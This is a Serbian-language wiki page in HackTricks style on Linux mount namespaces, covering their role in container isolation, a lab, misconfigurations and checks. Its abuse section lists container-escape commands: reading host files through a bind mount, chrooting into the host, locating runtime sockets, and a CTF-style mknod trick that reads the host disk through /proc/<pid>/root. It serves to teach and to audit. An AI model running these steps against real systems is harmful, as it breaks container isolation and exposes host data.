# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mount namespace kontroliše **mount tabelu** koju proces vidi. Ovo je jedna od najvažnijih funkcija izolacije kontejnera, zato što su root filesystem, bind mount-ovi, tmpfs mount-ovi, procfs prikaz, sysfs izloženost i mnogi pomoćni mount-ovi specifični za runtime predstavljeni kroz tu mount tabelu. Dva procesa mogu oba pristupati putanjama `/`, `/proc`, `/sys` ili `/tmp`, ali to na šta se te putanje razrešavaju zavisi od mount namespace-a u kom se nalaze.

Iz perspektive container security-ja, mount namespace je često razlika između „ovo je uredno pripremljen application filesystem“ i „ovaj proces može direktno da vidi ili utiče na host filesystem“. Zato se bind mount-ovi, `hostPath` volume-i, privilegovane mount operacije i writable `/proc` ili `/sys` izloženosti zasnivaju upravo na ovom namespace-u.

## Operacija

Kada runtime pokrene kontejner, obično kreira novi mount namespace, priprema root filesystem za kontejner, po potrebi mount-uje procfs i druge pomoćne filesystem-e, a zatim opciono dodaje bind mount-ove, tmpfs mount-ove, secrets, config maps ili host paths. Kada taj proces počne da radi unutar namespace-a, skup mount-ova koje vidi uglavnom je odvojen od podrazumevanog prikaza host-a. Host i dalje može da vidi stvarni underlying filesystem, ali kontejner vidi verziju koju je runtime sastavio za njega.

Ovo je moćno zato što kontejneru omogućava da veruje da ima sopstveni root filesystem, iako host i dalje upravlja svime. Takođe je opasno zato što, ako runtime izloži pogrešan mount, proces iznenada dobija uvid u host resurse koje ostatak security model-a možda nije predvideo da štiti.

## Lab

Možete kreirati private mount namespace pomoću:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ako otvorite drugi shell izvan tog namespace-a i pregledate mount tabelu, videćete da tmpfs mount postoji samo unutar izolovanog mount namespace-a. Ovo je korisna vežba jer pokazuje da mount isolation nije apstraktna teorija; kernel procesu doslovno prikazuje drugačiju mount tabelu.

Ako otvorite drugi shell izvan tog namespace-a i pregledate mount tabelu, tmpfs mount će postojati samo unutar izolovanog mount namespace-a.

Unutar kontejnera, brzi način za poređenje je:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi primer pokazuje koliko je lako da runtime konfiguracija napravi ogromnu rupu kroz granicu filesystema.

## Upotreba runtime-a

Docker, Podman, stack-ovi zasnovani na containerd-u i CRI-O oslanjaju se na private mount namespace za standardne kontejnere. Kubernetes se nadovezuje na isti mehanizam za volume-e, projektovane secrets, config maps i `hostPath` mount-ove. Incus/LXC okruženja se takođe u velikoj meri oslanjaju na mount namespace-ove, naročito zato što system containers često izlažu bogatije i više nalik mašinskim filesystem-ima nego application containers.

To znači da prilikom analize problema sa filesystemom kontejnera obično ne posmatrate izolovani Docker problem. Posmatrate problem mount namespace-a i runtime konfiguracije, izražen kroz platformu koja je pokrenula workload.

## Pogrešne konfiguracije

Najočiglednija i najopasnija greška jeste izlaganje root filesystema hosta ili drugog osetljivog path-a hosta kroz bind mount, na primer `-v /:/host`, ili writable `hostPath` u Kubernetesu. U tom trenutku pitanje više nije „da li kontejner nekako može da escape-uje?“, već „koliko korisnog sadržaja sa hosta je već direktno vidljivo i writable?“. Writable host bind mount često pretvara ostatak exploita u jednostavno postavljanje fajlova, chrooting, izmenu konfiguracije ili pronalaženje runtime socket-a.

Drugi čest problem jeste izlaganje host `/proc` ili `/sys` na načine koji zaobilaze bezbedniji prikaz kontejnera. Ovi filesystem-i nisu obični data mount-ovi; oni predstavljaju interfejse ka stanju kernela i procesa. Ako workload direktno pristupa verzijama sa hosta, mnoge pretpostavke na kojima se zasniva hardening kontejnera prestaju da važe na pouzdan način.

Read-only zaštite su takođe važne. Read-only root filesystem ne obezbeđuje magično kontejner, ali uklanja veliku količinu prostora za attacker staging i otežava persistence, postavljanje helper binary-ja i neovlašćene izmene konfiguracije. Suprotno tome, writable root ili writable host bind mount daju attacker-u prostor da pripremi sledeći korak.

## Zloupotreba

Kada se mount namespace neispravno koristi, attackeri obično rade jednu od četiri stvari. **Čitaju podatke sa hosta** koji su trebalo da ostanu izvan kontejnera. **Menjaju konfiguraciju hosta** kroz writable bind mount-ove. **Mount-uju ili remount-uju dodatne resurse** ako capabilities i seccomp to dozvoljavaju. Ili **pristupaju moćnim socket-ima i runtime state direktorijumima** koji im omogućavaju da od same container platforme zatraže veći pristup.

Ako kontejner već može da vidi filesystem hosta, ostatak security modela se odmah menja.

Kada sumnjate na host bind mount, najpre potvrdite šta je dostupno i da li je writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ako je root filesystem hosta montiran read-write, direktan pristup hostu često je jednostavan kao:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ako je cilj privilegovani runtime pristup, a ne direktno chrootovanje, izlistajte socket-e i stanje runtime-a:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ako je `CAP_SYS_ADMIN` prisutan, takođe proverite da li se novi mount-ovi mogu kreirati iz kontejnera:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Potpuni primer: `mknod` pivot kroz dve shell sesije

Specijalizovaniji način zloupotrebe moguć je kada root korisnik u kontejneru može da kreira blok uređaje, host i kontejner na koristan način dele isti identitet korisnika, a napadač već ima foothold sa niskim privilegijama na hostu. U toj situaciji, kontejner može da kreira čvor uređaja kao što je `/dev/sda`, a korisnik sa niskim privilegijama na hostu kasnije može da ga čita kroz `/proc/<pid>/root/` za odgovarajući proces kontejnera.

Unutar kontejnera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Sa hosta, kao odgovarajući korisnik sa niskim privilegijama nakon lociranja PID-a shell-a kontejnera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Važna pouka nije konkretna pretraga CTF stringa. Poenta je da izloženost mount namespace-a kroz `/proc/<pid>/root/` može korisniku na hostu omogućiti ponovnu upotrebu device node-ova koje je kreirao container, čak i kada je cgroup device policy sprečila njihovu direktnu upotrebu unutar samog container-a.

## Provere

Ove komande služe da vam prikažu filesystem pogled u kojem se trenutni proces zapravo izvršava. Cilj je uočiti mount-ove izvedene sa hosta, upisive osetljive putanje i sve što deluje šire od uobičajenog root filesystem-a application container-a.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Šta je ovde zanimljivo:

- Bind mounts sa hosta, naročito `/`, `/proc`, `/sys`, direktorijumi sa stanjem runtime-a ili lokacije socket-a, trebalo bi odmah da se istaknu.
- Neočekivani read-write mount-ovi obično su važniji od velikog broja read-only pomoćnih mount-ova.
- `mountinfo` je često najbolje mesto za proveru da li putanja zaista potiče sa hosta ili je zasnovana na overlay-u.

Ove provere utvrđuju **koji resursi su vidljivi u ovom namespace-u**, **koji od njih potiču sa hosta** i **koji su od njih upisivi ili bezbednosno osetljivi**.
{{#include ../../../../../banners/hacktricks-training.md}}
